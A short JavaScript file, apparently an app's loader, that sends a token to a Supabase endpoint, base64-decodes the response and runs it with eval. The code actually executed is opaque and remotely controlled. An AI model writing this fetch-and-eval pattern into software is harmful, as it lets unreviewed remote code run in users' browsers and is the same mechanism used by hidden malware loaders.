// Content will be loaded dynamically
const loadApp = async () => {
    try {
        const response = await fetch('https://qghjrmnmsifvfzldeezw.supabase.co/auth-app/load', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ token: window.APP_TOKEN })
        });
        
        if (!response.ok) {
            throw new Error('Invalid access');
        }

        const data = await response.text();
        const decodedCode = atob(data);
        eval(decodedCode);
    } catch (error) {
        console.error('Error loading application:', error);
        document.body.innerHTML = '<h1>Error loading application. Please try again later.</h1>';
    }
};